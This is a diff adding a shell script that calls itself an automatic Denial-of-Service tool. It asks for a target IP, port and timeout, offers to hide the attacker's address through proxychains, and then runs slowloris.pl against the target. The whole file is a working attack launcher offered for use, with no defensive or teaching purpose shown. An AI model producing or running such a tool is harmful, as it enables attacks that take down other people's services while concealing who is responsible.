@@ -1,0 +1,208 @@
+#!/bin/sh
+
+#Welcome
+clear
+echo ""
+date
+echo ""
+echo "Welcome to my automatic Denial-of-Service (DOS) tool"
+echo "Press any button to continue"; read -n 1 my_welcome_continue
+	if [ $my_welcome_continue = ]; then
+	  echo ""
+	else
+	  echo ""
+	fi
+clear
+#Getting all the user input
+ #IP
+  echo "Enter IP you want to attack:"
+  echo  ""
+  echo "Only IP's like '46.235.xx.xx' will work"
+  echo "Things like 'www.examplesite.com' won't work!"
+  echo ""
+  read my_ip
+  clear 
+
+
+
+ #Port
+  echo "Enter port:"; read my_port
+  clear
+
+
+
+ #Timeout
+  echo "Enter timeout time (in seconds):"; read my_timeout
+  clear
+
+
+
+ #Proxychain, yes or no
+  echo "Do you want to use proxychains? [Y/n]"
+  echo "(Use 'Y' or 'N')"
+  echo "" 
+  echo "WARNING:"
+  echo "If you select 'NO' your IP will not be hidden"
+  echo ""
+  read -n 1 my_proxychain
+
+
+
+###Proxychains: ON
+	if [ $my_proxychain = y ]; then
+		clear
+		echo "IP is $my_ip"
+		echo "Port is $my_port"
+			if [ $my_timeout -gt 1 ]; then
+          			echo "Timeout time is $my_timeout seconds"
+ 			 else 
+	  			echo "Timeout time is $my_timeout second"
+  			fi
+		echo "Proxychain is on"
+ 						  #Are you sure?
+							echo ""
+							echo "Are you sure you want to continue? [Y/n]"
+							echo "(Use 'Y' or 'N')"
+							read -n 1 my_continue
+	
+							if [ $my_continue = y ]; then
+							    clear
+							   proxychains ./slowloris.pl -dns $my_ip -port $my_port -timeout $my_timeout	
+							elif [ $my_continue = Y ]; then
+							    clear
+							   proxychains ./slowloris.pl -dns $my_ip -port $my_port -timeout $my_timeout	
+							else
+							   clear
+							    echo "You cancelled the attack"
+	 						   exit
+							fi
+
+	elif [ $my_proxychain = Y ]; then
+		clear
+		echo "IP is $my_ip"
+		echo "Port is $my_port"
+			if [ $my_timeout -gt 1 ]; then
+          			echo "Timeout time is $my_timeout seconds"
+ 			 else 
+	  			echo "Timeout time is $my_timeout second"
+  			fi
+		echo "Proxychain is on"
+ 						  #Are you sure?
+							echo ""
+							echo "Are you sure you want to continue? [Y/n]"
+							echo "(Use 'Y' or 'N')"
+							read -n 1  my_continue
+	
+							if [ $my_continue = y ]; then
+							    clear
+							   proxychains ./slowloris.pl -dns $my_ip -port $my_port -timeout $my_timeout	
+							elif [ $my_continue = Y ]; then
+							    clear
+							   proxychains ./slowloris.pl -dns $my_ip -port $my_port -timeout $my_timeout	
+							else
+							   clear
+							    echo "You cancelled the attack"
+	 						   exit
+							fi
+
+
+
+
+
+###Proxychains: OFF
+	elif [ $my_proxychain = n ]; then
+		clear
+		echo "IP is $my_ip"
+		echo "Port is $my_port"
+			if [ $my_timeout -gt 1 ]; then
+          			echo "Timeout time is $my_timeout seconds"
+ 			 else 
+	  			echo "Timeout time is $my_timeout second"
+  			fi
+		echo "Proxychain is off"
+ 						  #Are you sure?
+							echo ""
+							echo "Are you sure you want to continue? [Y/n]"
+							echo "(Use 'Y' or 'N')"
+							read -n 1  my_continue
+	
+							if [ $my_continue = y ]; then
+							    clear
+							   ./slowloris.pl -dns $my_ip -port $my_port -timeout $my_timeout	
+							elif [ $my_continue = Y ]; then
+							    clear
+							   ./slowloris.pl -dns $my_ip -port $my_port -timeout $my_timeout	
+							else
+							   clear
+							    echo "You cancelled the attack"
+	 						   exit
+							fi
+
+
+	elif [ $my_proxychain = N ]; then
+		clear
+		echo "IP is $my_ip"
+		echo "Port is $my_port"
+			if [ $my_timeout -gt 1 ]; then
+          			echo "Timeout time is $my_timeout seconds"
+ 			 else 
+	  			echo "Timeout time is $my_timeout second"
+  			fi
+		echo "Proxychain is off"
+ 						  #Are you sure?
+							echo ""
+							echo "Are you sure you want to continue? [Y/n]"
+							echo "(Use 'Y' or 'N')"
+							read -n 1  my_continue
+	
+							if [ $my_continue = y ]; then
+							    clear
+							   ./slowloris.pl -dns $my_ip -port $my_port -timeout $my_timeout	
+							elif [ $my_continue = Y ]; then
+							    clear
+							   ./slowloris.pl -dns $my_ip -port $my_port -timeout $my_timeout	
+							else
+							   clear
+							    echo "You cancelled the attack"
+	 						   exit
+							fi
+
+
+	#Proxychains: ERROR	
+		else
+			clear
+			echo "'$my_proxychain' is not an option. Use 'Y' or 'N'"
+			exit	
+		fi
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	 
+ 
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
